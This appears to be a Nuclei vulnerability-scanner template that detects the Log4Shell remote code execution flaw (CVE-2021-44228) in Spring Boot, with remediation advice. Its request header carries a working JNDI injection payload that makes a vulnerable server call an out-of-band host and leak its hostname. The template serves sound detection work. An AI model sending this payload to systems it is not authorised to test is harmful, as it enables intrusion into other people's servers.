id: springboot-log4j-rce
info:
  name: Spring Boot - Remote Code Execution (Apache Log4j)
  author: pdteam
  severity: critical
  description: Spring Boot is vulnerable to remote code execution through Apache Log4j.
  reference:
  - https://logging.apache.org/log4j/2.x/security.html
  - https://www.lunasec.io/docs/blog/log4j-zero-day/
  - https://github.com/twseptian/Spring-Boot-Log4j-CVE-2021-44228-Docker-Lab
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  remediation: Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0
    (for Java 8 and later).
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-502
  tags: cve,cve2021,springboot,rce,oast,log4j,kev
  metadata:
    impact: The discovery of the vulnerability in Spring Boot's log4j component has
      had a significant impact on the security landscape of applications built with
      Spring Boot.
    recommendation: I recommend updating Spring Boot to a version that is not vulnerable
      to the remote code execution exploit through Apache Log4j.
requests:
- raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    X-Api-Version: ${jndi:ldap://${hostName}.{{interactsh-url}}}

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
  extractors:
  - type: kval
    kval:
    - interactsh_ip
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
